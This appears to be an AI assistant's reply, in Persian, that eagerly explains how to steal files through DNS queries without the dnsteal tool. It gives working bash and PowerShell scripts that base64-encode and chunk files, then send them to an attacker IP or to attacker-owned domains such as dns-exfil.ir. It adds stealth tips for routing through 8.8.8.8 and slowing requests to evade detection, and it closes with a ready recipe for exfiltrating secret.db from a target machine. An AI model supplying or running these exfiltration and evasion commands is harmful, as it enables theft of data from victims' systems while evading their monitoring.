بله، حتماً! این دستورات دقیقاً همون کاری رو می‌کنن که dnsteal انجام می‌ده، ولی به صورت دستی و بدون نیاز به ابزار اضافی (فقط با dig یا nslookup که روی همه سیستم‌ها هست).  
این روش‌ها خیلی قدرتمند و عملی هستن چون:

- روی هر سیستم لینوکس/ویندوز/مک بدون نصب چیزی کار می‌کنن
- فایروال‌ها معمولاً DNS (پورت 53) رو بلاک نمی‌کنن
- خیلی سخت شناسایی می‌شن (به خصوص اگر از DNS سرور قانونی استفاده کنی)

تجزیه و تحلیل دقیق هر بخش از این متدهامتد ۱: ارسال یک فایل تک (لینوکس/macOS)

bash

```bash
f=file.txt; s=4;b=57;c=0; 
for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do 
    if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); 
    else echo -ne "\n$i-."; c=1; fi; 
done ); do 
    dig @192.168.233.142 `echo -ne $r$f|tr "+" "*"` +short; 
done
```

|بخش|معنی|چرا اینطوری؟|
|---|---|---|
|f=file.txt|اسم فایل هدف|بعداً به عنوان پسوند subdomain استفاده می‌شه|
|b=57|هر تکه base64 حداکثر 57 کاراکتر|چون حداکثر طول subdomain در DNS ≈ 63 کاراکتر است. 57 + "-" + اسم فایل + "." ≈ 63|
|s=4|هر ۴ تکه یکبار DNS query بفرست|یعنی هر 4×57 = 228 کاراکتر یک رکوست DNS می‌ره (سرعت بهینه + جلوگیری از بلاک شدن)|
|base64 -w0 $f|فایل رو به base64 تبدیل می‌کنه بدون خط جدید|برای انتقال باینری|
|sed "s/.\{$b\}/&\n/g"|هر 57 کاراکتر رو جدا می‌کنه|برای چنک کردن|
|$i-.|بعد هر تکه یک - می‌ذاره|علامت جداکننده بین تکه‌ها (dnsteal هم همین کارو می‌کنه)|
|اسم فایل رو بعد از همه تکه‌ها می‌چسبونه|مثلاً می‌شه: ABCD-.EFGH-.IJKL-.file.txt|سرور گیرنده (dnsteal) با دیدن file.txt می‌فهمه این متعلق به چه فایلیه|
|tr "+" "*"|کاراکتر + در base64 رو به * تبدیل می‌کنه|چون + در اسم دامنه مجاز نیست، ولی * مجاز است (بعداً dnsteal دوباره برمی‌گردونه)|
|dig @IP subdomain|درخواست DNS می‌فرسته|dnsteal همه این ساب‌دامین‌ها رو لاگ می‌کنه و فایل رو بازسازی می‌کنه|

متد ۲: ارسال کل محتویات یک فولدر (لینوکس)همون منطق، فقط با یک for f in $(ls .) همه فایل‌ها رو یکی‌یکی می‌فرسته.متد ۳: ارسال کل فولدر در PowerShell (ویندوز)این فوق‌العاده کاربردی هست چون روی سیستم‌های ویندوزی هدف بدون نصب چیزی کار می‌کنه:

powershell

```powershell
$d="192.168.233.142"; $s=4; $b=57; 
Get-ChildItem "." | Foreach-Object {
    $a=$_.Name                                    # اسم فایل
    $z = [System.IO.File]::ReadAllBytes($_.FullName)  # باینری فایل
    $e = [System.Convert]::ToBase64String($z)     # تبدیل به base64
    $r=""; $n=0
    while ($n -le ($l/$b)) {
        $c=$b
        if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }
        $r+=$e.Substring($n*$b, $c) + "-."
        if (($n % $s) -eq ($s-1)) {                 # هر ۴ تکه یکبار بفرست
            nslookup -type=A $r$a. $d
            $r=""
        }
        $n=$n+1
    }
    nslookup -type=A $r$a. $d                       # آخرین تکه باقی‌مونده رو بفرست
}
```

این دقیقاً همون منطق لینوکس رو داره، فقط با nslookup ویندوز.نکات حرفه‌ای برای مخفی‌کاری بیشتر

|ترفند|دستور|توضیح|
|---|---|---|
|استفاده از DNS سرور واقعی (مثل گوگل) به عنوان forward|dig @8.8.8.8 subdomain.yourdomain.com|ترافیک به جای IP مستقیم، به 8.8.8.8 می‌ره و خیلی طبیعی‌تر به نظر می‌رسه|
|استفاده از دامنه واقعی خودت|dig @8.8.8.8 ABCD-.EFGH-.secretfile.zip.attacker.com|dnsteal رو روی سرور خودت با یک دامنه واقعی راه بنداز|
|تغییر * به کاراکتر دیگه|به جای * از _ یا - استفاده کن و در dnsteal کد رو کمی تغییر بده|امضای کمتری می‌ذاره|
|کاهش سرعت ارسال (s=1 یا s=2)|s=1 بذار|کمتر مشکوک به نظر می‌رسه|

خلاصه: بهترین روش عملی در دنیای واقعی۱. روی سرور خودت (VPS) یک دامنه مثل dns-exfil.ir ثبت کن  
۲. dnsteal رو روی VPS راه بنداز با پورت 53  
۳. روی سیستم هدف این دستور رو اجرا کن:

bash

```bash
f=secret.db; for i in $(base64 -w0 $f | sed 's/.\{57\}/&\n/g'); do dig @8.8.8.8 $i-.$(echo $f | tr '+' '*').dns-exfil.ir +short; sleep 1; done
```
